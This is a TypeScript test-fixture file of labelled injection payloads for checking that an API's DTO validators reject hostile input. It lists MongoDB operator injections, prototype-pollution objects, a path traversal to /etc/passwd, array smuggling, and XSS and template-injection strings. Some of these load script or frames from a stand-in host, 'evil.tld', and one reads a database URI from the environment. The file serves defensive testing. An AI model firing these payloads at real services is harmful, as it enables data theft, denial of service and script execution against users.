/**
 * Payload corpora for DTO specs.
 *
 * Mongoose does not prepare queries: a value that reaches a filter is spliced into
 * the query document as-is. An object carrying a `$` key therefore becomes an
 * operator, and an array changes the semantics of an equality match. The DTO layer
 * is the only place where that is stopped, so every field a client can send must be
 * proven to reject these payloads rather than forward them.
 *
 * Each payload carries a label so `it.each` produces a readable test name.
 */

export interface InjectionPayload {
  label: string;
  value: unknown;
}

/**
 * Query operators an attacker can substitute for a scalar.
 * Placed in a field the API compares with `$eq`, most of these turn an exact match
 * into a predicate that matches every document.
 */
export const MONGO_INJECTIONS: InjectionPayload[] = [
  { label: "$ne null", value: { $ne: null } },
  { label: "$ne empty string", value: { $ne: "" } },
  { label: "$eq wrapper", value: { $eq: "fr" } },
  { label: "$gt empty string", value: { $gt: "" } },
  { label: "$gte empty string", value: { $gte: "" } },
  { label: "$lt max char", value: { $lt: "\uffff" } },
  { label: "$lte max char", value: { $lte: "\uffff" } },
  { label: "$in list", value: { $in: ["fr", "es", "ad"] } },
  { label: "$nin empty list", value: { $nin: [] } },
  { label: "$exists true", value: { $exists: true } },
  { label: "$regex match all", value: { $regex: ".*" } },
  { label: "$regex case insensitive", value: { $regex: "^", $options: "i" } },
  { label: "$regex catastrophic backtracking", value: { $regex: "(a+)+$" } },
  { label: "$where javascript", value: { $where: "return true" } },
  { label: "$expr always true", value: { $expr: { $eq: [1, 1] } } },
  {
    label: "$function javascript",
    value: {
      $function: { body: "function() { return true; }", args: [], lang: "js" },
    },
  },
  { label: "$type string", value: { $type: "string" } },
  { label: "$mod every value", value: { $mod: [1, 0] } },
  { label: "$all empty", value: { $all: [] } },
  { label: "$elemMatch operator", value: { $elemMatch: { $ne: null } } },
  { label: "$size zero", value: { $size: 0 } },
  { label: "$not negation", value: { $not: { $eq: null } } },
  { label: "$or always true", value: { $or: [{}] } },
  { label: "$and always true", value: { $and: [{}] } },
  { label: "$nor always true", value: { $nor: [{}] } },
  { label: "$jsonSchema empty", value: { $jsonSchema: {} } },
  { label: "$text search", value: { $text: { $search: "x" } } },
  { label: "$comment", value: { $comment: "injected" } },
  { label: "dotted key traversal", value: { "position.country": "es" } },
  { label: "update operator", value: { $set: { status: "ONLINE" } } },
];

/**
 * Values that break the runtime rather than the query: they make a validator or a
 * sanitizer throw, and an exception raised inside a `customSanitizer` is not caught
 * by express-validator, so the route answers 500 instead of 400.
 */
export const NODE_INJECTIONS: InjectionPayload[] = [
  { label: "undefined", value: undefined },
  { label: "null", value: null },
  { label: "empty string", value: "" },
  { label: "number zero", value: 0 },
  { label: "string zero", value: "0" },
  { label: "false", value: false },
  { label: "string false", value: "false" },
  { label: "NaN", value: NaN },
  { label: "Infinity", value: Infinity },
  { label: "negative number", value: -1 },
  { label: "float", value: 1.5 },
  { label: "large number", value: Number.MAX_SAFE_INTEGER },
  { label: "prototype key constructor", value: "constructor" },
  { label: "prototype key __proto__", value: "__proto__" },
  { label: "prototype key prototype", value: "prototype" },
  { label: "prototype key toString", value: "toString" },
  { label: "prototype key valueOf", value: "valueOf" },
  { label: "prototype key hasOwnProperty", value: "hasOwnProperty" },
  {
    label: "prototype pollution payload",
    value: JSON.parse('{"__proto__":{"polluted":true}}'),
  },
  {
    label: "constructor prototype pollution",
    value: JSON.parse('{"constructor":{"prototype":{"polluted":true}}}'),
  },
  {
    label: "object with broken toString",
    value: { toString: "not a function" },
  },
  { label: "object with throwing toJSON", value: { toJSON: 1 } },
  { label: "array-like object", value: { length: 1000000000 } },
  { label: "catastrophic regex source", value: "(a+)+$" },
  { label: "regex metacharacters", value: ".*" },
  { label: "very long string", value: "a".repeat(100000) },
  { label: "null byte", value: "fr\u0000injected" },
  { label: "control characters", value: "fr\u0007\u001b[2J" },
  { label: "path traversal", value: "../../../etc/passwd" },
  { label: "windows path traversal", value: "..\\..\\windows\\system32" },
  { label: "script tag", value: "<script>alert(1)</script>" },
  { label: "right to left override", value: "\u202egnp.exe" },
  { label: "surrogate pair", value: "\ud83d\udca9" },
  { label: "whitespace padded", value: "  fr  " },
  { label: "date instance", value: new Date() },
  { label: "empty object", value: {} },
  { label: "nested object", value: { a: { b: { c: 1 } } } },
  { label: "function source as string", value: "function () { return true; }" },
];

/**
 * express-validator converts a value to a string before running a standard
 * validator, and that conversion reads only the FIRST element of an array. A field
 * validated by `isIn`, `isString`, `isEmail` or `matches` therefore accepts
 * `["fr"]`, and `matchedData` hands the array on to Mongoose. An empty array skips
 * the check entirely. Only an explicit type check stops this.
 */
export const ARRAY_SMUGGLING: InjectionPayload[] = [
  { label: "empty array", value: [] },
  { label: "array wrapping a valid value", value: ["fr"] },
  { label: "array with a valid value first", value: ["fr", { $ne: null }] },
  { label: "nested array", value: [["fr"]] },
  { label: "array of operators", value: [{ $ne: null }] },
  { label: "sparse array", value: [undefined, "fr"] },
];

/**
 * Markup and script vectors. A plain-text field must refuse every one of these, and a
 * rich-text field must keep none of them executable after parsing.
 */
export const HTML_INJECTIONS: InjectionPayload[] = [
  { label: "script tag", value: "<script>alert(1)</script>" },
  { label: "script tag uppercase", value: "<SCRIPT>alert(1)</SCRIPT>" },
  {
    label: "script tag with attribute",
    value: '<script src="//evil.tld/x.js"></script>',
  },
  { label: "img onerror", value: "<img src=x onerror=alert(1)>" },
  { label: "svg onload", value: "<svg onload=alert(1)>" },
  { label: "body onload", value: "<body onload=alert(1)>" },
  { label: "iframe src", value: '<iframe src="//evil.tld"></iframe>' },
  {
    label: "iframe srcdoc",
    value: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  },
  { label: "object data", value: '<object data="//evil.tld"></object>' },
  { label: "embed src", value: '<embed src="//evil.tld">' },
  {
    label: "anchor javascript scheme",
    value: '<a href="javascript:alert(1)">link</a>',
  },
  {
    label: "anchor data scheme",
    value: '<a href="data:text/html,<script>alert(1)</script>">link</a>',
  },
  {
    label: "anchor vbscript scheme",
    value: '<a href="vbscript:msgbox(1)">link</a>',
  },
  {
    label: "style expression",
    value: "<style>body{background:url(javascript:alert(1))}</style>",
  },
  {
    label: "inline style attribute",
    value: '<p style="position:fixed;top:0">hijack</p>',
  },
  {
    label: "form action",
    value: '<form action="//evil.tld"><input name=p></form>',
  },
  {
    label: "meta refresh",
    value: '<meta http-equiv=refresh content="0;url=//evil.tld">',
  },
  { label: "base tag", value: '<base href="//evil.tld/">' },
  { label: "unclosed tag", value: "<img src=x onerror=alert(1)" },
  {
    label: "nested obfuscated script",
    value: "<scr<script>ipt>alert(1)</scr</script>ipt>",
  },
  {
    label: "encoded lower than",
    value: "&lt;script&gt;alert(1)&lt;/script&gt;",
  },
  {
    label: "numeric entity",
    value: "&#60;script&#62;alert(1)&#60;/script&#62;",
  },
  {
    label: "hex entity",
    value: "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
  },
  { label: "mixed case javascript scheme", value: "JaVaScRiPt:alert(1)" },
  { label: "javascript scheme with spacing", value: "javascript :alert(1)" },
  { label: "template literal expression", value: "${process.env.MONGODB_URI}" },
  {
    label: "handlebars expression",
    value: "{{constructor.constructor('return 1')()}}",
  },
  { label: "erb expression", value: "<%= 7 * 7 %>" },
  { label: "html comment", value: "<!-- injected -->" },
];

/** Everything above, for fields that should refuse anything but their own type */
export const ALL_INJECTIONS: InjectionPayload[] = [
  ...MONGO_INJECTIONS,
  ...NODE_INJECTIONS,
  ...HTML_INJECTIONS,
  ...ARRAY_SMUGGLING,
];

/** Payloads that are never a valid string, for `isString`-guarded fields */
export const NON_STRING_INJECTIONS: InjectionPayload[] = ALL_INJECTIONS.filter(
  (payload) => typeof payload.value !== "string"
);

/** Payloads that are never a valid array, for `isArray`-guarded fields */
export const NON_ARRAY_INJECTIONS: InjectionPayload[] = [
  ...MONGO_INJECTIONS,
  ...NODE_INJECTIONS,
];

/**
 * Everything a client must never be able to send, excluding the three values that
 * legitimately mean "no value" on an optional field: absent, null and empty string.
 */
export const NON_EMPTY_INJECTIONS: InjectionPayload[] = ALL_INJECTIONS.filter(
  ({ value }) => value !== null && value !== undefined && value !== ""
);
